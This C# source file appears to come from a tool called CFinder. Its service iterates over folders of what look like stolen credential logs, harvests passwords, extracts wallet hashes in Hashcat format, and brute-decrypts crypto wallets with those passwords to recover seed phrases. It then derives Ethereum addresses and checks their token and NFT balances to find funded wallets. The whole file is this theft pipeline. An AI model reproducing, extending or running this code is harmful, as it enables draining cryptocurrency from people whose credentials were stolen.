using CFinder.Application.Common.Exceptions;
using CFinder.Application.Models.Result;
using CFinder.Application.Models.Settings;
using CFinder.Application.Models.WorkHistory.DTOs;
using CFinder.Application.Repository.ResultRepository.Commands.CreateResult;
using CFinder.Application.Repository.SettingsRepository.Queries.GetActiveSettings;
using CFinder.Application.Repository.WorkHistoryRepository.Commands.CreateWorkHistory;
using CFinder.Application.Repository.WorkHistoryRepository.Commands.UpdateWorkHistory;
using CFinder.Application.ServerMethods.Base;
using CFinder.Application.ServerMethods.Override;
using CFinder.Domain.Settings;
using CFinder.Domain.WorkHistory;

namespace CFinder.Application.Services;

public class CryptoFinderService : BaseService
{
    private const string SERVICE_NAME = "Crypto Finder Service";
    
    private readonly LogParserServerMethod _parserServerMethod;
    private readonly AddressGeneratorServerMethod _addressGeneratorServerMethod;
    private readonly AnkrAddressCheckBalanceServerMethodOverride _balanceServerMethodOverride;


    private long _itteration;
    private WorkHistoryDto? WorkHistoryDto { get; set; }
    private UpdateWorkHistoryCommand? UpdateWorkHistoryCommand { get; set; }
    private SettingsDto? SettingsDto { get; set; }

    
    public CryptoFinderService(
        IServiceProvider serviceProvider,
        LogParserServerMethod parserServerMethod,
        AddressGeneratorServerMethod addressGeneratorServerMethod,
        AnkrAddressCheckBalanceServerMethodOverride balanceServerMethodOverride) 
        : base(serviceProvider)
    {
        _parserServerMethod = parserServerMethod;
        _addressGeneratorServerMethod = addressGeneratorServerMethod;
        _balanceServerMethodOverride = balanceServerMethodOverride;
    }

    public async Task StartAsync(string path)
    {
        await Task.CompletedTask;

        if (!Directory.Exists(path))
        {
            throw new NotFoundException(nameof(CryptoFinderService), path);
        }

        var directorys = Directory.GetDirectories(path).ToArray();

        var command = new CreateWorkHistoryCommand()
        {
            Name = SERVICE_NAME,
            Path = path,
            Total = directorys.Length
        };
        WorkHistoryDto = await Mediator.Send(command);
        SettingsDto = await Mediator.Send(new GetActiveSettingsQuery());

        try
        {
            foreach (var directory in directorys)
            {
                try
                {
                    ++_itteration;
                    Console.WriteLine(_itteration + " | " + directory);

                    var log = new LogDto();
                    log.Directory = directory;
                    log.Files = Directory.GetFiles(directory, "*", SearchOption.AllDirectories).ToArray();
                    var auths = await _parserServerMethod.GetAuthentication(directory, SettingsDto.ParserSettings.ParsingType);
                    var baseWallets = await _parserServerMethod.GetWalelts(directory);

                    string[] passwordList = auths
                        .Where(x => !string.IsNullOrWhiteSpace(x.Password))
                        .Select(x => x.Password)
                        .Distinct()
                        .ToArray()!;

                    switch (SettingsDto.ParserSettings.SaveAs)
                    {
                        case AuthSaveAs.SaveInDatabase:
                            log.Authentications = auths;
                            break;
                        case AuthSaveAs.SaveInFile:
                            await File.AppendAllLinesAsync("Passwords.txt", passwordList);
                            break;
                    }

                    foreach (var baseWallet in baseWallets)
                    {
                        log.Wallets = new List<WalletDto>();
                        var wallet = new WalletDto();
                        wallet.Type = baseWallet.walletType;
                        wallet.Directory = baseWallet.Directory;

                        wallet.Encrypted = await baseWallet.GetEncrypted(SettingsDto.DecryptorSettings);
                        wallet.Hashcat = await baseWallet.GetHashcat(wallet.Encrypted);

                        var searchedAddresses = await baseWallet.GetOriginalAddresses();

                        wallet.Addresses = new List<AddressInfoDto>();
                        foreach (var searchedAddress in searchedAddresses)
                        {
                            wallet.Addresses.Add(new AddressInfoDto()
                            {
                                Address = searchedAddress
                            });
                        }

                        if (SettingsDto.DecryptorSettings.TryDecrypt)
                        {
                            var (decrypted, password, mnemonic) =
                                await baseWallet.Decrypt(wallet.Encrypted, passwordList);
                            wallet.Decrypted = decrypted;
                            wallet.Password = password;
                            wallet.Secret = mnemonic;
                            if (!string.IsNullOrWhiteSpace(wallet.Secret))
                            {
                                wallet.HasBeenDecrypted = true;
                            }

                            var addressList = _addressGeneratorServerMethod.GetEthereumAddress(wallet.Secret,
                                SettingsDto.DecryptorSettings.DepthGenerate);

                            wallet.Addresses = new List<AddressInfoDto>();
                            foreach (var address in addressList)
                            {
                                wallet.Addresses.Add(new AddressInfoDto()
                                {
                                    Address = address
                                });
                            }
                            wallet.Addresses = wallet.Addresses
                                .DistinctBy(x => x.Address, StringComparer.OrdinalIgnoreCase)
                                .ToList();
                        }

                        var checkCryptoType = SettingsDto.BalanceCheckerSettings.CheckCrypto;
                        foreach (var walletInfoDto in wallet.Addresses)
                        {
                            if (checkCryptoType == CheckCryptoMode.AllCheck ||
                                checkCryptoType == CheckCryptoMode.CheckOnlyTokens)
                            {
                                walletInfoDto.Tokens =
                                    await _balanceServerMethodOverride.CheckToken(walletInfoDto.Address,
                                        SettingsDto.BalanceCheckerSettings.OnlyWhiteList);
                                await Task.Delay(SettingsDto.BalanceCheckerSettings.DelayBeforeRequest);
                            }

                            if (checkCryptoType == CheckCryptoMode.AllCheck ||
                                checkCryptoType == CheckCryptoMode.CheckOnlyNfts)
                            {
                                walletInfoDto.Nfts = await _balanceServerMethodOverride.CheckNFT(walletInfoDto.Address);
                                await Task.Delay(SettingsDto.BalanceCheckerSettings.DelayBeforeRequest);
                            }
                        }

                        if ((SettingsDto.DecryptorSettings.DecryptSaveAs == DecryptSaveAs.SaveAlways ||
                             (SettingsDto.DecryptorSettings.DecryptSaveAs == DecryptSaveAs.SaveAlways
                              && string.IsNullOrWhiteSpace(wallet?.Decrypted))) && wallet != null)
                        {
                            log.Wallets.Add(wallet);
                        }
                    }

                    var commandLogCreate = new CreateResultCommand()
                    {
                        Log = log
                    };
                    await Mediator.Send(commandLogCreate);
                }
                catch (Exception ex)
                {
                    Console.WriteLine(ex.Message);
                }
            }
            
            UpdateWorkHistoryCommand = new UpdateWorkHistoryCommand()
            {
                Id = WorkHistoryDto.Id,
                Current = WorkHistoryDto.Current,
                Total = WorkHistoryDto.Total,
                Status = Status.Finished,
                EndDate = DateTime.Now
            };
            await Mediator.Send(UpdateWorkHistoryCommand);
            
        }
        catch
        {
            UpdateWorkHistoryCommand = new UpdateWorkHistoryCommand()
            {
                Id = WorkHistoryDto.Id,
                Current = WorkHistoryDto.Current,
                Total = WorkHistoryDto.Total,
                Status = Status.Error,
                EndDate = DateTime.Now
            };
            await Mediator.Send(UpdateWorkHistoryCommand);
        }
    }
}